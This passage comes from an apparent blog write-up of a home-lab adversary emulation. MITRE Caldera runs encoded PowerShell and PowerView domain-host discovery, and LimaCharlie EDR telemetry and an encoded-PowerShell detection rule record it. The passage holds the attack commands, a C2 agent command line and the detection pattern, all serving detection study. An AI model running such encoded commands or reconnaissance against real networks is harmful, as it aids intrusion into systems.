</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>bbde0097323d5ef3b6dc604568de5e8c<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>		&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:5540
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>		&#34;</span>THIS_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>7af019fcf9ba0bb848cf51ac68de60ef<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>		&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>		&#34;</span>TIMESTAMP<span style=color:#f1fa8c>&#34;:1759404270750
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>		&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:5540
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:8360
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:17
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>}
</span></span></span></code></pre></div><p><strong>LimaCharlie Detections:</strong></p><p>In this section, we can catch suspicious processes through the detection rules that come by default (or you can add more). These rules work well. As you can see in the image below, multiple detection rules have been triggered for a process.</p><p>I will show you only one of them to avoid clutter. In the left section, the detection rules highlighted in blue have been triggered for the relevant Step 1 process.</p><p><img src=/images/calderacertutil/6.png alt=certutil></p><p><strong>Detection rule:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;detection&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>&#34;author&#34;</span>:<span style=color:#f1fa8c>&#34;_soteria-rules-edr-926e2197-189b-4d89-9675-c8993933dc9a[bulk][segment]&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;cat&#34;</span>:<span style=color:#f1fa8c>&#34;00014-WIN-Encoded_Powershell&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;detect&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff79c6>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff79c6>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc WwBTAHkAcwB<span style=color:#bd93f9>0</span>AGUAbQAuAE<span style=color:#bd93f9>4</span>AZQB<span style=color:#bd93f9>0</span>AC<span style=color:#bd93f9>4</span>ARABuAHMAXQA<span style=color:#bd93f9>6</span>ADoARwBlAHQASABvAHMAdABCAHkATgBhAG<span style=color:#bd93f9>0</span>AZQAoACQAZQBuAHYAOgBjAG<span style=color:#bd93f9>8</span>AbQBwAHUAdABlAHIATgBhAG<span style=color:#bd93f9>0</span>AZQApAC<span style=color:#bd93f9>4</span>ASABvA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System<span style=color:#bd93f9>32</span>\WindowsPowerShell\v<span style=color:#bd93f9>1.0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span><span style=color:#bd93f9>9785001</span>b<span style=color:#bd93f9>0</span>dcf<span style=color:#bd93f9>755</span>eddb<span style=color:#bd93f9>8</span>af<span style=color:#bd93f9>294</span>a<span style=color:#bd93f9>373</span>c<span style=color:#bd93f9>0</span>b<span style=color:#bd93f9>87</span>b<span style=color:#bd93f9>2498660</span>f<span style=color:#bd93f9>724e76</span>c<span style=color:#bd93f9>4</span>d<span style=color:#bd93f9>53</span>f<span style=color:#bd93f9>9</span>c<span style=color:#bd93f9>217</span>c<span style=color:#bd93f9>7</span>a<span style=color:#bd93f9>3</span><span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:55050240
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>&#34;</span>PARENT<span style=color:#f1fa8c>&#34;:{
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>&#34;</span>BASE_ADDRESS<span style=color:#f1fa8c>&#34;:12845056
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#34;</span>COMMAND_LINE<span style=color:#f1fa8c>&#34;:&#34;&#34;C:\Users\Public\Client1.exe&#34;</span> -server http:<span style=color:#6272a4>//10.1.4.40:8888 -group red &#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#6272a4></span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Users\Public\Client1.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>1306624</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>&#34;PARENT_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;a76b164d14483ef2a0016dab68de5e69&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>9660</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>4272</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>&#34;THIS_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;bbde0097323d5ef3b6dc604568de5e8c&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759403660323</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>4272</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>5540</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>19</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#f1fa8c>&#34;routing&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#ff79c6>&#34;arch&#34;</span>:<span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#f1fa8c>&#34;did&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#f1fa8c>&#34;event_id&#34;</span>:<span style=color:#f1fa8c>&#34;559ada23-c46e-43ee-a673-b80cae5ce302&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#f1fa8c>&#34;event_time&#34;</span>:<span style=color:#bd93f9>1759404270750</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span><span style=color:#f1fa8c>&#34;event_type&#34;</span>:<span style=color:#f1fa8c>&#34;NEW_PROCESS&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#f1fa8c>&#34;ext_ip&#34;</span>:<span style=color:#f1fa8c>&#34;79.238.92.208&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#f1fa8c>&#34;hostname&#34;</span>:<span style=color:#f1fa8c>&#34;client1.ssnrshnn.local&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span><span style=color:#f1fa8c>&#34;iid&#34;</span>:<span style=color:#f1fa8c>&#34;9b03d810-e114-4352-9392-a1186feb7894&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span><span style=color:#f1fa8c>&#34;int_ip&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#f1fa8c>&#34;latency&#34;</span>:<span style=color:#bd93f9>-550</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span><span style=color:#f1fa8c>&#34;moduleid&#34;</span>:<span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span><span style=color:#f1fa8c>&#34;oid&#34;</span>:<span style=color:#f1fa8c>&#34;c73795e0-a62c-4854-9462-be3d08769aa1&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#f1fa8c>&#34;parent&#34;</span>:<span style=color:#f1fa8c>&#34;bbde0097323d5ef3b6dc604568de5e8c&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span><span style=color:#f1fa8c>&#34;plat&#34;</span>:<span style=color:#bd93f9>268435456</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span><span style=color:#f1fa8c>&#34;sid&#34;</span>:<span style=color:#f1fa8c>&#34;23bf4a39-63f5-4808-8a3a-772460439fe4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span><span style=color:#f1fa8c>&#34;tags&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span><span style=color:#f1fa8c>&#34;windows&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51</span><span><span style=color:#f1fa8c>&#34;this&#34;</span>:<span style=color:#f1fa8c>&#34;7af019fcf9ba0bb848cf51ac68de60ef&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54</span><span><span style=color:#f1fa8c>&#34;detect_id&#34;</span>:<span style=color:#f1fa8c>&#34;711de844-83fb-4d11-b674-269968de60ee&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55</span><span><span style=color:#f1fa8c>&#34;detect_mtd&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56</span><span><span style=color:#ff79c6>&#34;description&#34;</span>:<span style=color:#f1fa8c>&#34;Powershell is a commandline interface built into the Windows operating systems for scripting and automating common system administrative tasks. Powershell includes an ability to decode and execute enc…&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57</span><span><span style=color:#f1fa8c>&#34;falsepositives&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58</span><span><span style=color:#f1fa8c>&#34;Devops tools such as Chef, Puppet, VS Code, Node Package Manager (NPM), and Windows Subsystem for Linux (WSL) commonly leverage Powershell and base64 encoding for automation. Additional legitimate sof…&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60</span><span><span style=color:#f1fa8c>&#34;references&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61</span><span><span style=color:#f1fa8c>&#34;https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62</span><span><span style=color:#f1fa8c>&#34;https://www.redcanary.com/blog/investigating-powershell-attacks/&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63</span><span><span style=color:#f1fa8c>&#34;https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">65</span><span><span style=color:#f1fa8c>&#34;tags&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">66</span><span><span style=color:#f1fa8c>&#34;attack.t1001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">67</span><span><span style=color:#f1fa8c>&#34;attack.t1027&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">68</span><span><span style=color:#f1fa8c>&#34;attack.t1059.001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">69</span><span><span style=color:#f1fa8c>&#34;attack.t1132.001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">70</span><span><span style=color:#f1fa8c>&#34;attack.t1140&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">71</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">72</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">73</span><span><span style=color:#f1fa8c>&#34;gen_time&#34;</span>:<span style=color:#bd93f9>1759404270275</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">74</span><span><span style=color:#f1fa8c>&#34;link&#34;</span>:<span style=color:#f1fa8c>&#34;https://app.limacharlie.io/orgs/c73795e0-a62c-4854-9462-be3d08769aa1/sensors/23bf4a39-63f5-4808-8a3a-772460439fe4/timeline?time=1759404270&amp;selected=7af019fcf9ba0bb848cf51ac68de60ef&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">75</span><span><span style=color:#f1fa8c>&#34;namespace&#34;</span>:<span style=color:#f1fa8c>&#34;general&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">76</span><span><span style=color:#f1fa8c>&#34;priority&#34;</span>:<span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">77</span><span><span style=color:#f1fa8c>&#34;rule_tags&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">78</span><span><span style=color:#f1fa8c>&#34;attack.t1001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">79</span><span><span style=color:#f1fa8c>&#34;attack.t1027&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">80</span><span><span style=color:#f1fa8c>&#34;attack.t1059.001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">81</span><span><span style=color:#f1fa8c>&#34;attack.t1132.001&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">82</span><span><span style=color:#f1fa8c>&#34;attack.t1140&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">83</span><span><span style=color:#f1fa8c>&#34;ext:soteria-rules-edr&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">84</span><span>]
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">85</span><span><span style=color:#f1fa8c>&#34;source&#34;</span>:<span style=color:#f1fa8c>&#34;c73795e0-a62c-4854-9462-be3d08769aa1.9b03d810-e114-4352-9392-a1186feb7894.23bf4a39-63f5-4808-8a3a-772460439fe4.10000000.2&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">86</span><span><span style=color:#f1fa8c>&#34;source_rule&#34;</span>:<span style=color:#f1fa8c>&#34;service.WIN-Encoded_Powershell&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">87</span><span><span style=color:#f1fa8c>&#34;ts&#34;</span>:<span style=color:#bd93f9>1759404270000</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">88</span><span>}
</span></span></code></pre></div><h2 id=step-2-discover-local-hosts><strong>Step 2: Discover local hosts</strong></h2><pre tabindex=0><code>Tactic: Discovery
Technique Name: Remote System Discovery
Technique ID: T1018
</code></pre><p><strong>Command:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1</span><span>powershell -Enc SQBtAHAAbwByAHQALQBNAG8AZAB1AGwAZQAgAC4AXABwAG8AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG8AbQBhAGkAbgBDAG8AbQBwAHUAdABlAHIA
</span></span></code></pre></div><p><strong>Decoded:</strong></p><pre tabindex=0><code>Import-Module .\powerview.ps1;Get-DomainComputer
</code></pre><p><strong>Command Output:</strong></p><pre tabindex=0><code>|remote.host.fqdn|ad-dc.ssnrshnn.local
|remote.host.fqdn|client1.ssnrshnn.local
|remote.host.fqdn|client2.ssnrshnn.local
|remote.host.fqdn|exchange.ssnrshnn.local
</code></pre><p><strong>LimaCharlie:</strong></p><p>Here you can see the second malicious process that has been created by Caldera as Step 2.</p><p><img src=/images/calderacertutil/4.png alt=certutil></p><p>The process tree view is similar to Step 1.</p><p><img src=/images/calderacertutil/5.png alt=certutil></p><p><strong>Parent process:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
